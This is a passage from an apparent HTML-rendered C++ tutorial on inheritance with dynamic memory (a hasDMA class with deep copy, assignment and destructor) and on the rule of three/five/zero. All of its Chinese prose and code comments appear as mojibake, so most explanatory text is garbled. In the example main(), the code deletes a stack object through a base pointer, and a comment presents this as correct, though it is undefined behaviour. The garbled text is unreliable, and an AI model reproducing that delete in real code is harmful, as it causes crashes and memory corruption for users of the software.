é‡Šæ”¾<strong>æ´¾ç”Ÿç±»å½“å‰å¯¹è±¡</strong>çš„æ—§åŠ¨æ€å†…å­˜ã€‚</li><li>  ä¸ºæ´¾ç”Ÿç±»å½“å‰å¯¹è±¡çš„åŠ¨æ€æˆå‘˜åˆ†é…æ–°å†…å­˜ï¼Œå¹¶ä»æºå¯¹è±¡å¤åˆ¶æ•°æ®ã€‚</li><li>  è¿”å› <code>*this</code>ã€‚</li></ul></li></ul><p><strong>ç¤ºä¾‹ (æ·»åŠ  hasDMA ç±»):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dma.h (ç»­)</span></span><br><span class="line"><span class="comment">// æ´¾ç”Ÿç±» - ä½¿ç”¨ new</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hasDMA</span> :</span> <span class="keyword">public</span> baseDMA &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span> * style; <span class="comment">// æ´¾ç”Ÿç±»ç®¡ç†çš„åŠ¨æ€å†…å­˜</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    hasDMA(<span class="keyword">const</span> <span class="keyword">char</span> * s = <span class="string">&quot;none&quot;</span>, <span class="keyword">const</span> <span class="keyword">char</span> * l = <span class="string">&quot;null&quot;</span>, <span class="keyword">int</span> r = <span class="number">0</span>);</span><br><span class="line">    hasDMA(<span class="keyword">const</span> <span class="keyword">char</span> * s, <span class="keyword">const</span> baseDMA &amp; rs);</span><br><span class="line">    hasDMA(<span class="keyword">const</span> hasDMA &amp; hs); <span class="comment">// å¤åˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line">    ~hasDMA(); <span class="comment">// ææ„å‡½æ•°</span></span><br><span class="line">    hasDMA &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> hasDMA &amp; hs); <span class="comment">// èµ‹å€¼è¿ç®—ç¬¦</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> hasDMA &amp; hs);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dma.cpp (ç»­)</span></span><br><span class="line"><span class="comment">// --- hasDMA å®ç° ---</span></span><br><span class="line">hasDMA::hasDMA(<span class="keyword">const</span> <span class="keyword">char</span> * s, <span class="keyword">const</span> <span class="keyword">char</span> * l, <span class="keyword">int</span> r)</span><br><span class="line">    : baseDMA(l, r) &#123; <span class="comment">// è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°</span></span><br><span class="line">    style = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(s) + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(style, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hasDMA::hasDMA(<span class="keyword">const</span> <span class="keyword">char</span> * s, <span class="keyword">const</span> baseDMA &amp; rs)</span><br><span class="line">    : baseDMA(rs) &#123; <span class="comment">// è°ƒç”¨åŸºç±»å¤åˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line">    style = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(s) + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(style, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hasDMA::hasDMA(<span class="keyword">const</span> hasDMA &amp; hs)</span><br><span class="line">    : baseDMA(hs) &#123; <span class="comment">// *** è°ƒç”¨åŸºç±»å¤åˆ¶æ„é€ å‡½æ•° ***</span></span><br><span class="line">    style = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(hs.style) + <span class="number">1</span>]; <span class="comment">// æ·±å¤åˆ¶æ´¾ç”Ÿç±»æˆå‘˜</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(style, hs.style);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hasDMA::~hasDMA() &#123;</span><br><span class="line">    <span class="keyword">delete</span> [] style; <span class="comment">// é‡Šæ”¾æ´¾ç”Ÿç±»åˆ†é…çš„å†…å­˜ (åŸºç±»ææ„å‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hasDMA &amp; hasDMA::<span class="keyword">operator</span>=(<span class="keyword">const</span> hasDMA &amp; hs) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;hs)</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    baseDMA::<span class="keyword">operator</span>=(hs); <span class="comment">// *** è°ƒç”¨åŸºç±»èµ‹å€¼è¿ç®—ç¬¦ ***</span></span><br><span class="line">    <span class="keyword">delete</span> [] style;        <span class="comment">// é‡Šæ”¾æ´¾ç”Ÿç±»æ—§å†…å­˜</span></span><br><span class="line">    style = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">std</span>::<span class="built_in">strlen</span>(hs.style) + <span class="number">1</span>]; <span class="comment">// æ·±å¤åˆ¶æ´¾ç”Ÿç±»æˆå‘˜</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">strcpy</span>(style, hs.style);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> hasDMA &amp; hs) &#123;</span><br><span class="line">    os &lt;&lt; (<span class="keyword">const</span> baseDMA &amp;) hs; <span class="comment">// æ˜¾ç¤ºåŸºç±»éƒ¨åˆ†</span></span><br><span class="line">    os &lt;&lt; <span class="string">&quot;Style: &quot;</span> &lt;&lt; hs.style &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æ˜¾ç¤ºæ´¾ç”Ÿç±»éƒ¨åˆ†</span></span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// usedma.cpp (ç»­)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ... (ä¹‹å‰çš„ä»£ç ) ...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nTesting hasDMA:\n&quot;</span>;</span><br><span class="line">    <span class="function">hasDMA <span class="title">map</span><span class="params">(<span class="string">&quot;Mercator&quot;</span>, <span class="string">&quot;Buffalo Keys&quot;</span>, <span class="number">5</span>)</span></span>;</span><br><span class="line">    hasDMA map2 = <span class="built_in">map</span>; <span class="comment">// è°ƒç”¨ hasDMA å¤åˆ¶æ„é€ å‡½æ•°</span></span><br><span class="line">    hasDMA map3;</span><br><span class="line">    map3 = <span class="built_in">map</span>; <span class="comment">// è°ƒç”¨ hasDMA èµ‹å€¼è¿ç®—ç¬¦</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Displaying hasDMA object:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">map</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result of hasDMA copy:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; map2;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Result of hasDMA assignment:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; map3;</span><br><span class="line"></span><br><span class="line">    baseDMA * p_dma2 = &amp;<span class="built_in">map</span>; <span class="comment">// åŸºç±»æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±»</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Deleting derived object via base pointer:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">delete</span> p_dma2; <span class="comment">// æ­£ç¡®è°ƒç”¨ ~hasDMA() ç„¶å ~baseDMA()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-7-3-ä½¿ç”¨åŠ¨æ€å†…å­˜åˆ†é…å’Œå‹å…ƒçš„ç»§æ‰¿ç¤ºä¾‹"><a href="#13-7-3-ä½¿ç”¨åŠ¨æ€å†…å­˜åˆ†é…å’Œå‹å…ƒçš„ç»§æ‰¿ç¤ºä¾‹" class="headerlink" title="13.7.3 ä½¿ç”¨åŠ¨æ€å†…å­˜åˆ†é…å’Œå‹å…ƒçš„ç»§æ‰¿ç¤ºä¾‹"></a>13.7.3 ä½¿ç”¨åŠ¨æ€å†…å­˜åˆ†é…å’Œå‹å…ƒçš„ç»§æ‰¿ç¤ºä¾‹</h3><p>åœ¨ä¸Šé¢çš„ <code>lacksDMA</code> å’Œ <code>hasDMA</code> ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬é‡è½½äº† <code>operator&lt;&lt;</code> ä½œä¸ºå‹å…ƒå‡½æ•°ã€‚å½“åœ¨æ´¾ç”Ÿç±»çš„å‹å…ƒå‡½æ•°ä¸­éœ€è¦æ˜¾ç¤ºåŸºç±»ä¿¡æ¯æ—¶ï¼Œæœ‰å‡ ç§æ–¹æ³•ï¼š</p><ol><li> <strong>ä½¿ç”¨åŸºç±»çš„å…¬æœ‰/ä¿æŠ¤æ¥å£:</strong> å¦‚æœåŸºç±»æä¾›äº†è®¿é—®æ‰€éœ€ä¿¡æ¯çš„ <code>public</code> æˆ– <code>protected</code> æ–¹æ³•ï¼Œå‹å…ƒå‡½æ•°å¯ä»¥é€šè¿‡æ´¾ç”Ÿç±»å¯¹è±¡è°ƒç”¨è¿™äº›æ–¹æ³•ã€‚</li><li> <strong>ä½¿ç”¨ç±»å‹è½¬æ¢:</strong> å°†æ´¾ç”Ÿç±»å¯¹è±¡çš„å¼•ç”¨å¼ºåˆ¶è½¬æ¢ä¸ºåŸºç±»å¯¹è±¡çš„å¼•ç”¨ <code>(const baseDMA &amp;) hs</code>ï¼Œç„¶åè°ƒç”¨åŸºç±»ç‰ˆæœ¬çš„ <code>operator&lt;&lt;</code>ã€‚è¿™è¦æ±‚åŸºç±» <code>operator&lt;&lt;</code> ä¹Ÿæ˜¯å‹å…ƒæˆ–èƒ½å¤Ÿé€šè¿‡å…¬æœ‰æ¥å£è®¿é—®æ‰€éœ€ä¿¡æ¯ã€‚</li><li> <strong>è®©æ´¾ç”Ÿç±»çš„å‹å…ƒä¹Ÿæ˜¯åŸºç±»çš„å‹å…ƒ:</strong> è¿™ç§æ–¹å¼æ¯”è¾ƒå°‘è§ï¼Œä¸”å¢åŠ äº†è€¦åˆåº¦ã€‚</li></ol><p>åœ¨ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ç±»å‹è½¬æ¢ <code>(const baseDMA &amp;) hs</code> æ¥è°ƒç”¨åŸºç±»çš„ <code>operator&lt;&lt;</code>ï¼Œè¿™æ˜¯ä¸€ç§å¸¸è§çš„åšæ³•ã€‚</p><p><strong>æ€»ç»“:</strong></p><ul><li>  å½“æ´¾ç”Ÿç±»ä¸ä½¿ç”¨ <code>new</code> æ—¶ï¼Œé€šå¸¸ä¾èµ–åŸºç±»æ­£ç¡®å®ç°çš„è™šææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦å³å¯ã€‚</li><li>  å½“æ´¾ç”Ÿç±»ä¹Ÿä½¿ç”¨ <code>new</code> æ—¶ï¼Œæ´¾ç”Ÿç±»å¿…é¡»æä¾›è‡ªå·±çš„ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ã€‚</li><li>  æ´¾ç”Ÿç±»çš„ææ„å‡½æ•°è´Ÿè´£æ¸…ç†æ´¾ç”Ÿç±»èµ„æºï¼ŒåŸºç±»ææ„å‡½æ•°è‡ªåŠ¨è°ƒç”¨ã€‚</li><li>  æ´¾ç”Ÿç±»çš„å¤åˆ¶æ„é€ å‡½æ•°å¿…é¡»åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­è°ƒç”¨åŸºç±»å¤åˆ¶æ„é€ å‡½æ•°ã€‚</li><li>  æ´¾ç”Ÿç±»çš„èµ‹å€¼è¿ç®—ç¬¦å¿…é¡»æ˜¾å¼è°ƒç”¨åŸºç±»èµ‹å€¼è¿ç®—ç¬¦ã€‚</li><li>  <strong>åŸºç±»ææ„å‡½æ•°åº”å§‹ç»ˆä¸ºè™šå‡½æ•°</strong>ï¼Œä»¥ç¡®ä¿é€šè¿‡åŸºç±»æŒ‡é’ˆ <code>delete</code> æ´¾ç”Ÿç±»å¯¹è±¡æ—¶è¡Œä¸ºæ­£ç¡®ã€‚</li></ul><h2 id="13-8-ç±»è®¾è®¡å›é¡¾"><a href="#13-8-ç±»è®¾è®¡å›é¡¾" class="headerlink" title="13.8 ç±»è®¾è®¡å›é¡¾"></a>13.8 ç±»è®¾è®¡å›é¡¾</h2><p>ç»è¿‡å‰é¢å‡ ç« çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å·²ç»æ¥è§¦äº† C++ ç±»è®¾è®¡çš„è®¸å¤šæ–¹é¢ï¼Œä»åŸºç¡€çš„å°è£…åˆ°å¤æ‚çš„ç»§æ‰¿å’ŒåŠ¨æ€å†…å­˜ç®¡ç†ã€‚æœ¬èŠ‚å°†å›é¡¾ä¸€äº›å…³é”®çš„è®¾è®¡å†³ç­–å’Œæœ€ä½³å®è·µã€‚</p><h3 id="13-8-1-ç¼–è¯‘å™¨ç”Ÿæˆçš„æˆå‘˜å‡½æ•°"><a href="#13-8-1-ç¼–è¯‘å™¨ç”Ÿæˆçš„æˆå‘˜å‡½æ•°" class="headerlink" title="13.8.1 ç¼–è¯‘å™¨ç”Ÿæˆçš„æˆå‘˜å‡½æ•°"></a>13.8.1 ç¼–è¯‘å™¨ç”Ÿæˆçš„æˆå‘˜å‡½æ•°</h3><p>C++ ç¼–è¯‘å™¨å¯ä»¥ä¸ºæˆ‘ä»¬è‡ªåŠ¨ç”Ÿæˆä¸€äº›ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ï¼Œä½†è¿™å¹¶ä¸æ€»æ˜¯è¶³å¤Ÿçš„ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†èµ„æºï¼ˆå¦‚åŠ¨æ€å†…å­˜ï¼‰æˆ–è®¾è®¡ç»§æ‰¿å±‚æ¬¡ç»“æ„æ—¶ã€‚</p><ol><li><p><strong>é»˜è®¤æ„é€ å‡½æ•° (Default Constructor):</strong></p><ul><li>  <strong>ç”Ÿæˆæ—¶æœº:</strong> å¦‚æœä½ <strong>æ²¡æœ‰</strong>å£°æ˜ä»»ä½•æ„é€ å‡½æ•°ã€‚</li><li>  <strong>è¡Œä¸º:</strong> å¯¹æˆå‘˜æ‰§è¡Œé»˜è®¤åˆå§‹åŒ–ï¼ˆå†…ç½®ç±»å‹ä¸åˆå§‹åŒ–ï¼Œç±»ç±»å‹è°ƒç”¨å…¶é»˜è®¤æ„é€ å‡½æ•°ï¼‰ã€‚</li><li>  <strong>æ³¨æ„:</strong> å¦‚æœä½ å®šä¹‰äº†ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨å°±ä¸ä¼šç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•°ã€‚å¦‚æœæ­¤æ—¶ä½ è¿˜éœ€è¦ä¸€ä¸ªæ— å‚æ„é€ å‡½æ•°ï¼Œå¿…é¡»è‡ªå·±å®šä¹‰ã€‚</li></ul></li><li><p><strong>ææ„å‡½æ•° (Destructor):</strong></p><ul><li>  <strong>ç”Ÿæˆæ—¶æœº:</strong> å¦‚æœä½ æ²¡æœ‰å£°æ˜ææ„å‡½æ•°ã€‚</li><li>  <strong>è¡Œä¸º:</strong> å¯¹ç±»ç±»å‹çš„æˆå‘˜è°ƒç”¨å®ƒä»¬çš„ææ„å‡½æ•°ã€‚</li><li>  <strong>æ³¨æ„:</strong> å¦‚æœç±»ç®¡ç†éœ€è¦æ˜¾å¼é‡Šæ”¾çš„èµ„æºï¼ˆå¦‚ <code>new</code> åˆ†é…çš„å†…å­˜ï¼‰ï¼Œ<strong>å¿…é¡»</strong>æä¾›è‡ªå®šä¹‰ææ„å‡½æ•°ã€‚å¦‚æœç±»æ‰“ç®—ä½œä¸ºåŸºç±»ï¼Œææ„å‡½æ•°<strong>åº”è¯¥</strong>æ˜¯ <code>virtual</code> çš„ã€‚</li></ul></li><li><p><strong>å¤åˆ¶æ„é€ å‡½æ•° (Copy Constructor):</strong></p><ul><li>  <strong>ç”Ÿæˆæ—¶æœº:</strong> å¦‚æœä½ æ²¡æœ‰å£°æ˜å¤åˆ¶æ„é€ å‡½æ•°ï¼ˆä¸”æ²¡æœ‰å£°æ˜ç§»åŠ¨æ“ä½œï¼‰ã€‚</li><li>  <strong>è¡Œä¸º:</strong> æ‰§è¡Œ**æˆå‘˜é€ä¸€å¤åˆ¶ (æµ…å¤åˆ¶)**ã€‚å¯¹äºç±»ç±»å‹æˆå‘˜ï¼Œè°ƒç”¨å…¶å¤åˆ¶æ„é€ å‡½æ•°ã€‚</li><li>  <strong>æ³¨æ„:</strong> å¦‚æœç±»ç®¡ç†åŠ¨æ€å†…å­˜æˆ–åŒ…å«ä¸èƒ½ç®€å•å¤åˆ¶çš„èµ„æºï¼ˆå¦‚æ–‡ä»¶å¥æŸ„ï¼‰ï¼Œ<strong>å¿…é¡»</strong>æä¾›è‡ªå®šä¹‰å¤åˆ¶æ„é€ å‡½æ•°ä»¥å®ç°<strong>æ·±å¤åˆ¶</strong>ã€‚</li></ul></li><li><p><strong>å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ (Copy Assignment Operator):</strong></p><ul><li>  <strong>ç”Ÿæˆæ—¶æœº:</strong> å¦‚æœä½ æ²¡æœ‰å£°æ˜å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ï¼ˆä¸”æ²¡æœ‰å£°æ˜ç§»åŠ¨æ“ä½œï¼‰ã€‚</li><li>  <strong>è¡Œä¸º:</strong> æ‰§è¡Œ**æˆå‘˜é€ä¸€èµ‹å€¼ (æµ…å¤åˆ¶)**ã€‚å¯¹äºç±»ç±»å‹æˆå‘˜ï¼Œè°ƒç”¨å…¶å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ã€‚</li><li>  <strong>æ³¨æ„:</strong> å¦‚æœç±»ç®¡ç†åŠ¨æ€å†…å­˜æˆ–éœ€è¦ç‰¹æ®Šèµ‹å€¼é€»è¾‘ï¼Œ<strong>å¿…é¡»</strong>æä¾›è‡ªå®šä¹‰å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ï¼Œç¡®ä¿æ·±å¤åˆ¶ã€å¤„ç†è‡ªæˆ‘èµ‹å€¼å¹¶é‡Šæ”¾æ—§èµ„æºã€‚</li></ul></li><li><p><strong>ç§»åŠ¨æ„é€ å‡½æ•° (Move Constructor) (C++11):</strong></p><ul><li>  <strong>ç”Ÿæˆæ—¶æœº:</strong> å¦‚æœä½ <strong>æ²¡æœ‰</strong>å£°æ˜ä»»ä½•å¤åˆ¶æ“ä½œï¼ˆå¤åˆ¶æ„é€ ã€å¤åˆ¶èµ‹å€¼ï¼‰ã€ç§»åŠ¨æ“ä½œï¼ˆç§»åŠ¨æ„é€ ã€ç§»åŠ¨èµ‹å€¼ï¼‰æˆ–ææ„å‡½æ•°ã€‚</li><li>  <strong>è¡Œä¸º:</strong> æ‰§è¡Œ<strong>æˆå‘˜é€ä¸€ç§»åŠ¨</strong>ã€‚å¯¹äºç±»ç±»å‹æˆå‘˜ï¼Œè°ƒç”¨å…¶ç§»åŠ¨æ„é€ å‡½æ•°ã€‚ç›®çš„æ˜¯é«˜æ•ˆåœ°è½¬ç§»èµ„æºæ‰€æœ‰æƒï¼Œè€Œä¸æ˜¯å¤åˆ¶ã€‚</li><li>  <strong>æ³¨æ„:</strong> å¦‚æœéœ€è¦è‡ªå®šä¹‰èµ„æºè½¬ç§»é€»è¾‘ï¼Œæˆ–è€…é»˜è®¤çš„æˆå‘˜ç§»åŠ¨ä¸åˆé€‚ï¼Œå¯ä»¥è‡ªå®šä¹‰ã€‚å¦‚æœå®šä¹‰äº†ä»»ä½•å¤åˆ¶æ“ä½œæˆ–ææ„å‡½æ•°ï¼Œé»˜è®¤çš„ç§»åŠ¨æ„é€ å‡½æ•°é€šå¸¸ä¸ä¼šç”Ÿæˆï¼Œéœ€è¦æ—¶éœ€æ˜¾å¼ <code>= default</code> æˆ–è‡ªå®šä¹‰ã€‚</li></ul></li><li><p><strong>ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ (Move Assignment Operator) (C++11):</strong></p><ul><li>  <strong>ç”Ÿæˆæ—¶æœº:</strong> ä¸ç§»åŠ¨æ„é€ å‡½æ•°ç±»ä¼¼ã€‚</li><li>  <strong>è¡Œä¸º:</strong> æ‰§è¡Œ<strong>æˆå‘˜é€ä¸€ç§»åŠ¨èµ‹å€¼</strong>ã€‚</li><li>  <strong>æ³¨æ„:</strong> ä¸ç§»åŠ¨æ„é€ å‡½æ•°ç±»ä¼¼ï¼Œå¦‚æœéœ€è¦è‡ªå®šä¹‰æˆ–é»˜è®¤ç‰ˆæœ¬æœªç”Ÿæˆï¼Œéœ€æ˜¾å¼å¤„ç†ã€‚</li></ul></li></ol><p><strong>ä¸‰/äº”/é›¶æ³•åˆ™ (Rule of Three/Five/Zero):</strong></p><ul><li>  <strong>ä¸‰æ³•åˆ™ (C++11 å‰):</strong> å¦‚æœä½ éœ€è¦è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°æˆ–å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ä¸­çš„<strong>ä»»ä½•ä¸€ä¸ª</strong>ï¼Œä½ å‡ ä¹è‚¯å®šéœ€è¦<strong>å…¨éƒ¨ä¸‰ä¸ª</strong>ã€‚</li><li>  <strong>äº”æ³•åˆ™ (C++11):</strong> å¦‚æœä½ éœ€è¦è‡ªå®šä¹‰ä¸Šè¿°ä¸‰ä¸ªæˆ–ç§»åŠ¨æ„é€ å‡½æ•°/ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ä¸­çš„<strong>ä»»ä½•ä¸€ä¸ª</strong>ï¼Œä½ å¯èƒ½éœ€è¦è€ƒè™‘<strong>å…¨éƒ¨äº”ä¸ª</strong>ã€‚</li><li>  <strong>é›¶æ³•åˆ™ (æ¨è):</strong> ä¼˜å…ˆä½¿ç”¨ RAIIï¼ˆèµ„æºè·å–å³åˆå§‹åŒ–ï¼‰åŸåˆ™ï¼Œåˆ©ç”¨æ ‡å‡†åº“å®¹å™¨ï¼ˆ<code>std::string</code>, <code>std::vector</code>ï¼‰å’Œæ™ºèƒ½æŒ‡é’ˆï¼ˆ<code>std::unique_ptr</code>, <code>std::shared_ptr</code>ï¼‰æ¥ç®¡ç†èµ„æºã€‚å¦‚æœç±»åªåŒ…å«è¿™äº›èƒ½è‡ªæˆ‘ç®¡ç†çš„æˆå‘˜ï¼Œé€šå¸¸<strong>ä¸éœ€è¦</strong>è‡ªå®šä¹‰ä»»ä½•ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤ç‰ˆæœ¬å°±èƒ½å¾ˆå¥½åœ°å·¥ä½œã€‚</li></ul><h3 id="13-8-2-å…¶ä»–çš„ç±»æ–¹æ³•"><a href="#13-8-2-å…¶ä»–çš„ç±»æ–¹æ³•" class="headerlink" title="13.8.2 å…¶ä»–çš„ç±»æ–¹æ³•"></a>13.8.2 å…¶ä»–çš„ç±»æ–¹æ³•</h3><p>é™¤äº†ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œç±»è¿˜åŒ…å«å…¶ä»–ç”¨äºå®ç°å…¶åŠŸèƒ½çš„æ–¹æ³•ï¼š</p><ol><li> <strong>æ„é€ å‡½æ•° (Constructors):</strong> é™¤äº†é»˜è®¤æ„é€ å‡½æ•°ï¼Œè¿˜å¯ä»¥å®šä¹‰å¤šä¸ªæ„é€ å‡½æ•°æ¥æä¾›ä¸åŒçš„å¯¹è±¡åˆå§‹åŒ–æ–¹å¼ï¼ˆä¾‹å¦‚ï¼Œæ¥å—ä¸åŒå‚æ•°ï¼‰ã€‚ä½¿ç”¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨æ¥åˆå§‹åŒ–æˆå‘˜å˜é‡ã€‚è€ƒè™‘ä½¿ç”¨ <code>explicit</code> å…³é”®å­—é˜»æ­¢ä¸æœŸæœ›çš„å•å‚æ•°éšå¼è½¬æ¢ã€‚</li><li> <strong>è®¿é—®å™¨ (Accessors):</strong> é€šå¸¸æ˜¯ <code>public const</code> æˆå‘˜å‡½æ•°ï¼Œç”¨äºè·å–å¯¹è±¡çš„çŠ¶æ€ï¼ˆç§æœ‰æ•°æ®æˆå‘˜çš„å€¼ï¼‰ï¼Œä½†ä¸ä¿®æ”¹å¯¹è±¡ã€‚ä¾‹å¦‚ <code>Balance() const</code>ã€‚</li><li> <strong>ä¿®æ”¹å™¨ (Mutators) / è®¾ç½®å™¨ (Setters):</strong> ç”¨äºä¿®æ”¹å¯¹è±¡çŠ¶æ€ï¼ˆç§æœ‰æ•°æ®æˆå‘˜çš„å€¼ï¼‰çš„ <code>public</code> æˆå‘˜å‡½æ•°ã€‚ä¾‹å¦‚ <code>ResetTable(bool v)</code>ã€‚</li><li> <strong>åŠŸèƒ½å‡½æ•° (Utility Functions):</strong> å®ç°ç±»æ ¸å¿ƒé€»è¾‘çš„å…¶ä»–æˆå‘˜å‡½æ•°ã€‚å¯ä»¥æ˜¯ <code>public</code>, <code>protected</code>, æˆ– <code>private</code>ã€‚</li><li> <strong><code>const</code> æˆå‘˜å‡½æ•°:</strong> åœ¨å‡½æ•°å£°æ˜å’Œå®šä¹‰ååŠ  <code>const</code>ï¼Œè¡¨ç¤ºè¯¥å‡½æ•°ä¸ä¼šä¿®æ”¹è°ƒç”¨å®ƒçš„å¯¹è±¡çš„çŠ¶æ€ï¼ˆæ•°æ®æˆå‘˜ï¼‰ã€‚<code>const</code> å¯¹è±¡åªèƒ½è°ƒç”¨ <code>const</code> æˆå‘˜å‡½æ•°ã€‚</li><li> <strong>é™æ€æˆå‘˜å‡½æ•° (<code>static</code>):</strong> ä¸ç±»æœ¬èº«å…³è”ï¼Œè€Œä¸æ˜¯ç‰¹å®šå¯¹è±¡ã€‚æ²¡æœ‰ <code>this</code> æŒ‡é’ˆï¼Œåªèƒ½è®¿é—®é™æ€æˆå‘˜ã€‚é€šè¿‡ç±»åè°ƒç”¨ (<code>ClassName::staticFunc()</code>)ã€‚</li><li> <strong>è™šå‡½æ•° (<code>virtual</code>):</strong> ç”¨äºåœ¨ç»§æ‰¿å±‚æ¬¡ç»“æ„ä¸­å®ç°å¤šæ€ã€‚å…è®¸é€šè¿‡åŸºç±»æŒ‡é’ˆ/å¼•ç”¨è°ƒç”¨æ´¾ç”Ÿç±»çš„ç‰¹å®šå®ç°ã€‚</li></ol><h3 id="13-8-3-å…¬æœ‰ç»§æ‰¿çš„è€ƒè™‘å› ç´ "><a href="#13-8-3-å…¬æœ‰ç»§æ‰¿çš„è€ƒè™‘å› ç´ " class="headerlink" title="13.8.3 